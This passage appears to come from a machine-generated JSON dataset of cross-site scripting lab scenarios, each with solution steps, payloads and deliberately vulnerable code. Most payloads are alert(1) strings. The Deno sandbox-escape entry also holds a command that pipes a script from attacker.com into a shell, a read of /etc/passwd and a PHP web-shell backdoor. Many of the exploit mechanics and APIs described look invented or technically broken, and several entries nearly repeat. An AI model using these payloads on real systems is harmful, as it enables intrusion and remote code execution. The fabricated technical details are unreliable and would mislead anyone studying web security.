        "Verify in Chromium-based browsers"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "<iframe src=\"https://attacker.com\" allow=\"trusted-types *\"></iframe>",
        "trustedTypes.createPolicy('default', {createHTML: s=>s})"
      ],
      "srcCode": "app.use((req, res) => {\n  res.setHeader('Cross-Origin-Opener-Policy', 'same-origin-allow-popups');\n  res.setHeader('Cross-Origin-Embedder-Policy', 'unsafe-none'); // Dangerous\n});"
    },
    {
      "Lab scenario": "WebGPU Shader Injection in 3D Design Viewer",
      "Lab Description": "CAD visualization tool processes WGSL shaders from untrusted sources with debug logging. The application converts shader compilation errors to HTML without sanitization. To solve: Inject JavaScript through crafted shader error messages.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Trigger shader compilation errors with malformed directives",
        "Craft payload: //! <img src=x onerror=alert(1)>",
        "Bypass error sanitization using line continuation escapes",
        "Chain with push constant buffer overflows",
        "Verify via Chrome WebGPU Inspector"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "@vertex fn main() -> [[location(0)]] vec4<f32> { return vec4<f32>(); } // </style><script>alert(1)</script>",
        "[[stage(vertex)]] fn main() -> [[location(0)]] vec4<f32> { /* <svg/onload=alert(1)> */ }"
      ],
      "srcCode": "device.createShaderModule({ code: userShader }).catch((e) => {\n  document.getElementById('errors').innerHTML = e.message; // Vulnerable\n});"
    },
    {
      "Lab scenario": "HTTP/3 Early Data XSS in E-Commerce Cache",
      "Lab Description": "Online store implements HTTP/3 with 0-RTT early data support. The application caches responses containing unvalidated early data parameters. To solve: Poison CDN cache through TLS 1.3 early data injection.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Craft early data request using curl --http3 --early-data",
        "Inject payload: GET /?q=<script>alert(1)</script> HTTP/3",
        "Bypass request replay protection via session ticket rotation",
        "Automate with h2o HTTP/3 client",
        "Verify through Cloudflare cache status"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "Early-Data: 1\n\nGET /?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/3",
        "Alt-Svc: h3=\":443\"; ma=86400"
      ],
      "srcCode": "app.use((req, res) => {\n  if (req.earlyData) {\n    res.send(`Search results for: ${req.query.q}`); // Vulnerable\n  }\n});"
    },
    {
      "Lab scenario": "Deno Runtime Sandbox Escape via WebSocket Proxy",
      "Lab Description": "Serverless platform exposes Deno WebSocket proxy with --allow-net permissions. The application uses Deno.writeTextFile() with unsanitized input. To solve: Achieve RCE through XSS-to-filesystem bridge.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Intercept WebSocket upgrade request with OWASP ZAP",
        "Craft payload: Deno.writeTextFile('/var/www/html/backdoor', '<?=`$_GET[0]`?>')",
        "Bypass permission prompts using WebSocket origin validation flaws",
        "Chain with file:// protocol handling",
        "Verify through writeFileSync success callback"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "<script>Deno.run({cmd:['bash','-c','curl attacker.com/shell.sh|sh']})</script>",
        "fetch('file:///etc/passwd').then(r=>r.text())"
      ],
      "srcCode": "Deno.serve((req) => {\n  const ws = new WebSocket(req);\n  ws.onmessage = (e) => {\n    eval(e.data); // Vulnerable\n  };\n});"
    },
    {
      "Lab scenario": "WebCodecs Video Frame XSS in Live Streaming Platform",
      "Lab Description": "Video streaming service processes raw YUV frames using WebCodecs API with vulnerable debug overlays. The application injects user-controlled metadata into <canvas> elements via innerHTML. To solve: Achieve XSS through crafted video timestamp payloads.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Capture video stream using MediaRecorder API",
        "Inject payload: <!--</canvas><svg/onload=alert(1)>-->",
        "Bypass frame validation using color space conversion quirks",
        "Chain with OffscreenCanvas rendering pipeline",
        "Verify through WebGL texture analysis"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "videoFrame.copyTo(new Uint8Array([60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62]))",
        "timestamp: 0x3Cscript%3Ealert(1)%3C/script%3E"
      ],
      "srcCode": "const encoder = new VideoEncoder({\n  output: (frame) => {\n    document.getElementById('overlay').innerHTML += \n      `TS: ${frame.timestamp}`; // Vulnerable\n  }\n});"
    },
    {
      "Lab scenario": "Private Network Access XSS in Internal Monitoring Tool",
      "Lab Description": "Corporate network dashboard uses insecure Private Network Access headers with postMessage handlers. The application trusts origin validation for internal IP ranges. To solve: Bypass PNA restrictions through DNS rebinding and inject XSS via cross-origin messages.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Set up DNS rebinding attack with 127.0.0.1 resolution",
        "Craft payload: window.opener.postMessage('<img/src=x onerror=alert(1)>','*')",
        "Bypass IP validation using IPv4-mapped IPv6 addresses",
        "Automate with TTL manipulation in BIND",
        "Verify through internal network traversal"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "location.href = 'http://[::ffff:127.0.0.1]/dashboard'",
        "<iframe src=\"http://attacker.com\" onload=\"contentWindow.postMessage('<script>alert(1)</script>','*')\"></iframe>"
      ],
      "srcCode": "window.addEventListener('message', (e) => {\n  if(e.origin.startsWith('http://10.')) {\n    document.body.innerHTML = e.data; // Vulnerable\n  }\n});"
    },
    {
      "Lab scenario": "Import Attributes Injection in Micro-Frontend Orchestrator",
      "Lab Description": "Cloud-native platform dynamically constructs module imports using user-controlled attributes. The application passes import assertions without validation. To solve: Hijack module loading via crafted integrity hashes and type assertions.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Intercept module fetch with Service Worker",
        "Craft payload: import('./malicious.js', {assert: {type: 'text/html'}})",
        "Bypass SRI using hash collision attacks",
        "Chain with modulepreload speculation rules",
        "Verify through dependency graph visualization"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "import('data:text/javascript,alert(1)', {assert:{type:'css'}})",
        "<script type=\"module\" integrity=\"sha256-...\">import</script>"
      ],
      "srcCode": "const module = await import(userPath, {\n  assert: JSON.parse(userAssertions) // Vulnerable\n});"
    },
    {
      "Lab scenario": "WebHID Device Spoofing XSS in Medical IoT Portal",
      "Lab Description": "Patient monitoring system connects to WebHID devices without proper origin validation. The application renders device names in dashboards using innerText with vulnerable CSS escapes. To solve: Inject XSS through spoofed HID device metadata.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Spoof HID device using Teensy microcontroller",
        "Craft payload: \"deviceName\": \"\\3C script\\3E alert(1)\\3C /script\\3E\"",
        "Bypass USB descriptor validation using report ID manipulation",
        "Automate with WebHID polyfill injections",
        "Verify through patient vitals display"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "{\"vendorId\":0x1337,\"productId\":0x0001,\"deviceName\":\"<svg/onload=alert(1)>\"}",
        "hidDevice.sendReport(new Uint8Array([60,115,99,114,105,112,116,62]))"
      ],
      "srcCode": "navigator.hid.requestDevice().then(devices => {\n  document.getElementById('device').innerText = \n    devices[0].productName; // Vulnerable CSS unescape\n});"
    },
    {
      "Lab scenario": "ARIA Role XSS in Accessibility Interface",
      "Lab Description": "Screen reader compatibility layer misinterprets ARIA role attributes as executable code. The application uses role values in click handlers without validation. To solve: Achieve XSS through crafted role=alertdialog payloads.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Identify ARIA role injection via Lighthouse audit",
        "Craft payload: <div role=\"alertdialog\" aria-label=\"</div><script>alert(1)</script>\">",
        "Bypass sanitizer using ARIA 1.2 role taxonomy",
        "Chain with accessible name calculation quirks",
        "Verify through NVDA screen reader output"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "<span role=\"button\" aria-keyshortcuts=\"Shift+Alt+X\" onkeydown=\"alert(1)\">",
        "<div role=\"math\" aria-label=\"\\3C script\\3E alert(1)\\3C /script\\3E\"></div>"
      ],
      "srcCode": "document.querySelectorAll('[role]').forEach(el => {\n  el.addEventListener('click', () => {\n    eval(el.getAttribute('role')); // Vulnerable\n  });\n});"
    },
    {
      "Lab scenario": "WebAssembly Component Model XSS in Decentralized Exchange",
      "Lab Description": "Blockchain DEX processes WASM components with unsafe interface type reflection. The application renders component exports using innerHTML for debug purposes. To solve: Achieve XSS through maligned string encoding in component model adapters.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Compile malicious component using jco toolchain",
        "Craft payload: (component (export \"\\3C script\\3E alert(1)\" (func)))",
        "Bypass UTF-8 validation using WTF-8 encoding",
        "Chain with multi-memory proposals",
        "Verify via WASI preview2 runtime"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "data:application/wasm-component;base64,CmNvbXBvbmVudAo...",
        "(instance (export \"<svg/onload=alert(1)>\" (func 0)))"
      ],
      "srcCode": "const component = await WebAssembly.compileComponent(userUpload);\ndocument.getElementById('exports').innerHTML = \n  JSON.stringify(component.exports); // Vulnerable"
    },
    {
      "Lab scenario": "HTTP/2 Rapid Reset Cache Poisoning XSS in CDN Edge Nodes",
      "Lab Description": "Global CDN caches H/2 streams with vulnerable rapid reset request handling. The application reflects query parameters in stale cached responses. To solve: Poison edge cache via request cancellation attacks with XSS payloads.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Craft H/2 stream with RST_STREAM frames using h2spec",
        "Inject payload: GET /?q=<script>alert(1)</script> HTTP/2",
        "Bypass HPACK compression with Huffman coding bypass",
        "Automate with nghttp2 flood tool",
        "Verify via Cloudflare cache-status headers"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        ":method: GET\n:path: /?q=%3Cscript%3Ealert(1)%3C/script%3E\n\n",
        "accept-encoding: gzip, deflate, br\ncache-control: no-cache\n"
      ],
      "srcCode": "app.get('/', (req, res) => {\n  res.set('Cache-Control', 'public, max-age=300');\n  res.send(`Search: ${req.query.q}`); // Vulnerable\n});"
    },
    {
      "Lab scenario": "WebNN Model Poisoning XSS in AI Art Generator",
      "Lab Description": "Generative AI platform loads ONNX models with unsafe tensor metadata handling. The application reflects model labels in <meta> tags without sanitization. To Solve: Inject HTML through crafted model output names.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Modify ONNX model using onnx-modifier",
        "Craft payload: output_name: \"</title><svg/onload=alert(1)>\"",
        "Bypass model signature validation using quantization",
        "Chain with WebGPU buffer binding",
        "Verify through art gallery rendering"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "{\"outputs\":[{\"name\":\"\\3C script\\3E alert(1) \"}]}",
        "tensor_name: Uint8Array.from([60,115,99,114,105,112,116,62])"
      ],
      "srcCode": "const model = await navigator.ml.createContext().loadModel(userModel);\ndocument.head.innerHTML += \n  `<meta name=\"model-output\" content=\"${model.outputs[0].name}\">`; // Vulnerable"
    },
    {
      "Lab scenario": "Storage Access API XSS in Multi-Site Embedded Widget",
      "Lab Description": "Universal login widget uses storageAccess() with permissive cross-site cookie access. The application renders OAuth states in hidden fields via dangerouslySetInnerHTML. To Solve: Bypass same-site restrictions via nested iframe storage grants.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create triple-nested iframe structure",
        "Craft payload: document.hasStorageAccess().then(() => { /* XSS */ })",
        "Bypass user gesture requirements using requestStorageAccessFor()",
        "Chain with postMessage state synchronization",
        "Verify through cross-domain cookie access"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "<iframe src=\"attacker.com\" allow=\"storage-access 'self'\"></iframe>",
        "document.requestStorageAccessFor('https://victim.com')"
      ],
      "srcCode": "document.hasStorageAccess().then((hasAccess) => {\n  document.getElementById('state').innerHTML = \n    `<input type=\"hidden\" value=\"${hasAccess}\">`; // Vulnerable\n});"
    },
    {
      "Lab scenario": "SVG Font Injection XSS in Design Platform Icon Editor",
      "Lab Description": "Vector graphics editor processes SVG fonts with unsafe @font-face rules. The application uses DOMPurify 3.1.0 with whitelisted font loading. To Solve: Achieve XSS through font glyph path command injection.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create malicious SVG font using FontForge",
        "Craft payload: <glyph unicode='&#x3C;' d='M0 0' onload='alert(1)'/>",
        "Bypass MIME type validation using data: URLs",
        "Chain with CSS @font-face selector",
        "Verify through icon preview rendering"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "<svg><font><font-face><glyph unicode=\"<\" d=\"M0 0\" onload=\"alert(1)\"/></font></svg>",
        "@font-face { font-family:x; src:url('data:image/svg+xml,<svg/>...'); }"
      ],
      "srcCode": "app.post('/font', (req, res) => {\n  const sanitized = DOMPurify.sanitize(req.body.svg, {\n    ALLOWED_TAGS: ['font', 'glyph'] // Dangerous\n  });\n  res.send(sanitized);\n});"
    },
    {
      "Lab scenario": "DOM XSS in AI-Powered Chat History Export",
      "Lab Description": "LLM chatbot platform exports conversation history as HTML files using unsafe document.implementation.createHTMLDocument(). The application inserts user-controlled message IDs into CSS selectors. To solve: Execute alert() through CSS injection in exported files.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Export chat history via API using Postman",
        "Craft payload: message-id{background-image:url('javascript:alert(1)')}",
        "Bypass sanitizer using CSS escape sequences",
        "Chain with SVG font-face rules",
        "Verify through Chromium PDF rendering"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "<style>#\\33A7F9 { content: \"</style><script>alert(1)</script>\" }</style>",
        "<link rel=stylesheet href='data:,*%7Bcolor:red%7D'/>"
      ],
      "srcCode": "const doc = document.implementation.createHTMLDocument();\ndoc.body.innerHTML = `<div id='${userID}'>${messages}</div>`; // Vulnerable"
    },
    {
      "Lab scenario": "Stored XSS in VR Meeting Room Descriptions",
      "Lab Description": "Metaverse platform stores WebGL room descriptions in IndexedDB without output encoding. The application renders 3D text using Three.js TextGeometry with raw HTML. To solve: Inject WebGL shader code that triggers JS execution.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Intercept WebSocket room update messages",
        "Craft payload: <mesh onclick=alert(1)>",
        "Bypass Three.js sanitization using BufferGeometry",
        "Automate with A-Frame VR toolkit",
        "Verify through Oculus browser"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "new THREE.TextGeometry('\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E')",
        "material.onBeforeCompile = (shader) => { alert(1) }"
      ],
      "srcCode": "const loader = new THREE.ObjectLoader();\nloader.parse(userData, (obj) => {\n  scene.add(obj); // Vulnerable 3D object\n});"
    },
    {
      "Lab scenario": "Mutation XSS in Biometric Auth Error Pages",
      "Lab Description": "Fingerprint login system displays authentication errors using innerText with vulnerable CSS escape handling. The application implements broken Unicode normalization for error codes. To solve: Abuse CSS counter styles to reconstruct script tags.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Trigger auth failures with modified fingerprint data",
        "Craft payload: Error 0xFE0F: \\FE0F\\003Cscript\\003E",
        "Bypass textContent sanitization using CSS.supports()",
        "Chain with ::marker pseudo-element injection",
        "Verify in Safari's text renderer"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "counter-reset: x 0x3C; content: counter(x, upper-hexadecimal)",
        "@counter-style x { system: cyclic; symbols: \"\\3C script\\3E\" }"
      ],
      "srcCode": "app.get('/auth-error', (req, res) => {\n  res.send(`<div class='error'>Code: ${req.query.code}</div>`); // Vulnerable\n});"
    },
    {
      "Lab scenario": "Blind XSS in Drone Telemetry Dashboard",
      "Lab Description": "UAV control system stores flight logs in Elasticsearch without input sanitization. The application uses Kibana Timelion expressions to visualize data. To solve: Achieve XSS through malicious Timelion sheet formulas.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Inject payload via MAVLink telemetry stream",
        "Craft formula: .es('</script><svg/onload=alert(1)>')",
        "Bypass Lucene query parsing using URL encoding",
        "Automate with DroneKit Python API",
        "Monitor Kibana Discover tab"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        ".label(\"\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E\")",
        ".title('<img/src=x onerror=alert(document.domain)>')"
      ],
      "srcCode": "app.post('/telemetry', (req, res) => {\n  esClient.index({\n    index: 'drones',\n    body: req.body // Raw input\n  });\n});"
    },
    {
      "Lab scenario": "Reflected XSS in Web3 DAO Proposal Renderer",
      "Lab Description": "Blockchain governance platform renders proposal markdown using insecure remark-html configuration. The application allows raw HTML in CommonMark with broken sanitization. To solve: Execute alert() through malicious proposal titles.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Submit proposal via Ethers.js contract interaction",
        "Craft payload: [x](javascript://%0aalert(1))",
        "Bypass markdown renderer using soft line breaks",
        "Automate with Hardhat test suite",
        "Verify through Snapshot.org-style UI"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "```html\n<script>alert(1)</script>\n```",
        "[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pgo=)"
      ],
      "srcCode": "const html = unified()\n  .use(remarkParse)\n  .use(remarkHtml, {sanitize: false}) // Vulnerable\n  .processSync(markdown);"
    },
    {
      "Lab scenario": "WebGPU Compute Shader XSS in Cryptocurrency Mining Dashboard",
      "Lab Description": "Mining pool interface processes compute shaders with unsafe buffer sharing between JS/WebGPU. The application maps storage buffers to DOM elements via innerHTML. To solve: Corrupt GPU buffers to inject HTML payloads.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Reverse-engineer shader using WGSL analyzer",
        "Craft payload: [[stage(compute), workgroup_size(64)]] fn main() { /* <script> */ }",
        "Bypass buffer validation using out-of-bounds writes",
        "Chain with timestamp queries for timing attacks",
        "Verify via Chrome WebGPU Inspector"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "device.createBuffer({mappedAtCreation: true, size: 64, usage: GPUBufferUsage.STORAGE }).getMappedRange().set(new TextEncoder().encode('</canvas><svg onload=alert(1)>'))",
        "[[block]] struct XSS { data: array<u32>; };"
      ],
      "srcCode": "const buffer = device.createBuffer({ /* user-controlled */ });\ndocument.getElementById('stats').innerHTML = \n  new TextDecoder().decode(buffer.getMappedRange());"
    },
    {
      "Lab scenario": "WebHID Medical Sensor XSS in Telehealth Platform",
      "Lab Description": "Patient monitoring system connects to WebHID glucose monitors without input validation. The application renders device names in <select> elements via dangerouslySetInnerHTML. To solve: Spoof medical device metadata to inject XSS payloads.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Spoof HID device using Raspberry Pi Pico",
        "Craft payload: \"productName\": \"\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E\"",
        "Bypass USB descriptor validation using phantom interfaces",
        "Automate with WebHID polyfill",
        "Verify through patient chart rendering"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "{\"vendorId\":0xDEAD,\"productId\":0xBEEF,\"productName\":\"<iframe/src=javascript:alert(1)>\"}",
        "reportDescriptor: new Uint8Array([0x06, 0x00, 0xFF, ...])"
      ],
      "srcCode": "navigator.hid.requestDevice().then(devices => {\n  document.getElementById('device-list').innerHTML = \n    devices.map(d => `<option>${d.productName}</option>`); // Vulnerable\n});"
    },
    {
      "Lab scenario": "HTTP/3 DATAGRAM XSS in Real-Time Sports Betting",
      "Lab Description": "Odds streaming service uses QUIC DATAGRAM frames with unsafe buffer concatenation. The application processes early data with vulnerable TextDecoder streams. To solve: Inject XSS through fragmented QUIC payloads.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Craft DATAGRAM frames using quiche library",
        "Inject payload: 0x3C 0x73 0x63 0x72 0x69 0x70 0x74 0x3E",
        "Bypass flow control using connection migration",
        "Automate with Cloudflare quiche examples",
        "Verify through betting slip rendering"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "new QuicDatagram(new Uint8Array([60,115,99,114,105,112,116,62]))",
        "quic_send(fd, buffer, 0x3C7363726970743E)"
      ],
      "srcCode": "quiche_conn_recv_dgram(conn, buf, buf_len, &info);\nprintf(\"Received: %s\", buf); // Vulnerable logging"
    },
    {
      "Lab scenario": "CSS Anchor Positioning XSS in Legal Document Editor",
      "Lab Description": "Contract drafting tool implements CSS anchor positioning with unsafe grid-template-area names. The application reflects user input in CSSOM using insertRule(). To solve: Abuse grid area identifiers to break style context.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify grid injection via DevTools Styles panel",
        "Craft payload: grid-template-areas: \"</style><script>alert(1)</script>\"",
        "Bypass sanitizer using CSS escape sequences",
        "Chain with @layer ordering attacks",
        "Verify through PDF export rendering"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "grid-template-areas: \"\\3C script\\3E alert(1) \\3C /script\\3E\"",
        "@container style(--x: </style><svg/onload=alert(1)>)"
      ],
      "srcCode": "const sheet = new CSSStyleSheet();\nsheet.replaceSync(`:root { --areas: \"${userInput}\" }`); // Vulnerable\n document.adoptedStyleSheets = [sheet];"
    },
    {
      "Lab scenario": "WebTransport Bidirectional Stream XSS in AR Navigation",
      "Lab Description": "Augmented reality navigation system uses WebTransport streams for location updates. The application processes geospatial data with unsafe DOMParser(). To solve: Inject HTML through malformed GeoJSON payloads.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Intercept WebTransport session via DevTools Protocol",
        "Craft payload: {\"type\":\"Feature\",\"properties\":{\"</script><svg onload=alert(1)>\":1}}",
        "Bypass QUIC stream limits using connection migration",
        "Automate with webtransport-py",
        "Verify through 3D map overlay"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "new TextEncoder().encode('</script><svg/onload=alert(document.domain)>')",
        "data:application/geo+json,{\"coordinates\":[0,0],\"html\":\"<script>alert(1)</script>\"}"
      ],
      "srcCode": "const decoder = new TextDecoder();\nfor await (const chunk of reader) {\n  document.getElementById('map').innerHTML += \n    decoder.decode(chunk); // Vulnerable\n}"
    },
    {
      "Lab scenario": "WebCodecs Video Frame Injection in Live Streaming Moderation",
      "Lab Description": "Content moderation tool analyzes video streams using WebCodecs API with unsafe debug overlay rendering. The application injects user-controlled metadata into <canvas> via innerHTML. To solve: Achieve XSS through crafted video timestamp payloads.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Intercept H.264 stream using FFmpeg",
        "Inject payload: <!--</canvas><svg/onload=alert(1)>--> in SEI messages",
        "Bypass frame validation using color space conversion quirks",
        "Chain with WebGL texture sampling",
        "Verify through moderation UI overlay"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "videoFrame.copyTo(new Uint8Array([...'<script>alert(1)</script>']))",
        "timestamp: 0x3C7363726970743E"
      ],
      "srcCode": "const encoder = new VideoEncoder({\n  output: (frame) => {\n    document.getElementById('overlay').innerHTML += \n      `TS: ${frame.timestamp}`; // Vulnerable\n  }\n});"
    },
    {
      "Lab scenario": "Private Network Access Bypass in Internal HR System",
      "Lab Description": "Employee portal uses relaxed PNA headers with postMessage handlers trusting internal IPs. The application renders error messages via dangerouslySetInnerHTML. To solve: Bypass IP validation via DNS rebinding and inject XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Configure DNS rebinding to 127.0.0.1",
        "Craft payload: window.opener.postMessage('<img/src=x onerror=alert(1)>','*')",
        "Bypass CORS using 103 Early Hints responses",
        "Automate with dnsmasq config",
        "Verify through internal VPN access"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "<iframe src=\"http://[::ffff:127.0.0.1]\" allow=\"storage-access 'self'\"></iframe>",
        "fetch('http://10.0.0.1', {mode: 'no-cors'})"
      ],
      "srcCode": "window.addEventListener('message', (e) => {\n  if(e.origin.startsWith('http://192.168')) {\n    document.body.innerHTML = e.data; // Vulnerable\n  }\n});"
    },
    {
      "Lab scenario": "Import Maps Sandbox Escape in Micro-Frontend Host",
      "Lab Description": "Cloud platform dynamically constructs import maps from URL parameters with lax Content-Security-Policy. The application uses JSON.parse() on user input without validation. To solve: Hijack module loading via crafted integrity hashes.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Intercept import map request via MitM proxy",
        "Inject payload: {\"imports\":{\"react\":\"data:text/javascript,alert(1)\"}}",
        "Bypass SRI using hash length extension attacks",
        "Chain with modulepreload hints",
        "Verify through dependency tree visualization"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "import('data:text/javascript,alert(document.domain)')",
        "<script type=\"importmap\">{\"imports\":{\"@core/\":\"javascript:alert(1)\"}}</script>"
      ],
      "srcCode": "app.get('/config', (req, res) => {\n  res.json(JSON.parse(req.query.imports)); // Vulnerable\n});"
    },
    {
      "Lab scenario": "ARIA Live Region XSS in Social Media Notifications",
      "Lab Description": "Accessibility-focused platform uses aria-live regions with dangerous dynamic content updates. The application renders notifications via innerHTML without sanitizing screen reader text. To solve: Abuse live region politeness levels to trigger XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Trigger notification via API spam",
        "Craft payload: <div aria-live=\"assertive\"><script>alert(1)</script></div>",
        "Bypass sanitizer using ARIA role=alertdialog",
        "Chain with Speech Synthesis API",
        "Verify through NVDA screen reader"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "<span role=\"alert\">\u202e}\u202ealert(1)//</span>",
        "<div aria-hidden=\"true\"><template shadowroot=open><script>alert(1)</script>"
      ],
      "srcCode": "function showNotification(text) {\n  liveRegion.innerHTML = text; // Vulnerable\n}"
    },
    {
      "Lab scenario": "WebNN Model Poisoning XSS in AI-Powered Recruiting",
      "Lab Description": "Job matching service loads ONNX models with unsafe tensor metadata handling. The application reflects model labels in <meta> tags without encoding. To solve: Inject HTML through crafted model output names.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Modify ONNX model using Netron",
        "Craft payload: output_name: \"</title><svg/onload=alert(1)>\"",
        "Bypass model signature validation via quantization",
        "Chain with WebGPU buffer binding",
        "Verify through candidate profile rendering"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "{\"outputs\":[{\"name\":\"\\u003Cscript\\u003Ealert(1)\"}]}",
        "tensor_name: Uint8Array.from([60,115,99,114,105,112,116,62])"
      ],
      "srcCode": "const model = await navigator.ml.createContext().loadModel(userUpload);\ndocument.head.innerHTML += \n  `<meta name=\"model-output\" content=\"${model.outputs[0].name}\">`;"
    },
    {
      "Lab scenario": "WebAssembly Threads XSS in Multiplayer Game Lobby",
      "Lab Description": "Browser-based game uses WebAssembly threads for real-time sync with unsafe SharedArrayBuffer exposure. The application renders player names via innerHTML using memory-mapped Atomics. To solve: Corrupt shared memory to inject HTML payloads.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Analyze shared memory with Chrome DevTools Memory Inspector",
        "Craft payload: Atomics.store(memory, 0, 0x3C7363726970743E)",
        "Bypass bounds checking via growable memory",
        "Chain with worker.postMessage() timing attacks",
        "Verify through leaderboard rendering"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "new SharedArrayBuffer(1024).set([...'<script>alert(1)</script>'])",
        "WebAssembly.instantiate(maliciousModule, {env:{memory: new Memory({initial:1})}})"
      ],
      "srcCode": "const memory = new WebAssembly.Memory({ shared: true, initial: 1 });\ndocument.getElementById('players').innerHTML = \n  new TextDecoder().decode(memory.buffer); // Vulnerable"
    },
    {
      "Lab scenario": "HTTP/2 Trailers XSS in Ad Tech Bid Stream",
      "Lab Description": "Real-time bidding platform processes HTTP/2 trailers with vulnerable trailer header reflection. The application logs bid responses using console.html() without encoding. To solve: Inject XSS via malformed Trailer: XSS-Header fields.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Craft H/2 request with trailers using nghttp2",
        "Inject payload: Trailer: XSS-Header: <script>alert(1)</script>",
        "Bypass HPACK compression via header table size manipulation",
        "Automate with Python hyper-h2 library",
        "Verify through ad campaign dashboard"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "trailers: {'x-trailer': 'javascript:alert(1)'}",
        "END_STREAM flag with trailing headers containing XSS"
      ],
      "srcCode": "app.use((req, res) => {\n  req.on('trailers', (trailers) => {\n    console.log(`Trailers: ${trailers}`); // Vulnerable\n  });\n});"
    },
    {
      "Lab scenario": "CSS View Transitions XSS in E-Commerce Product Carousel",
      "Lab Description": "Product carousel implements view transitions API with unsafe pseudo-element content handling. The application reflects product IDs in ::view-transition-old() selectors. To solve: Abuse named transitions to inject style-based XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify transition targets via Chrome Rendering panel",
        "Craft payload: ::view-transition-old(xss) { content: \"</style><svg/onload=alert(1)>\" }",
        "Bypass sanitizer using CSS escape sequences",
        "Chain with @starting-style rules",
        "Verify through cross-document transitions"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "@view-transition { navigation: auto; }\n::view-transition-group(*) { content: \"\\3C script\\3E alert(1) \" }",
        "document.startViewTransition(() => { location.href = 'data:text/html,<script>alert(1)</script>' })"
      ],
      "srcCode": "document.startViewTransition(() => {\n  document.getElementById('carousel').innerHTML = \n    `<div style=\"view-transition-name: ${productID}\"></div>`; // Vulnerable\n});"
    },
    {
      "Lab scenario": "WebSerial API Spoofing XSS in Industrial Control Panel",
      "Lab Description": "SCADA system connects to WebSerial devices with unsafe port.claim() validation. The application renders device metadata via innerText with vulnerable CSS escapes. To solve: Spoof USB-CDC device with malicious metadata.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Spoof serial device using Arduino Leonardo",
        "Craft payload: \"productId\": \"\\3C script\\3E alert(1)\\3C /script\\3E\"",
        "Bypass serial buffer validation using flowControl: 'hardware'",
        "Automate with WebSerial polyfill",
        "Verify through HMI interface"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "{\"usbVendorId\":0x1234,\"usbProductId\":0x5678,\"productName\":\"<iframe/src=javascript:alert(1)>\"}",
        "serialPort.write(new TextEncoder().encode('</script><svg/onload=alert(1)>'))"
      ],
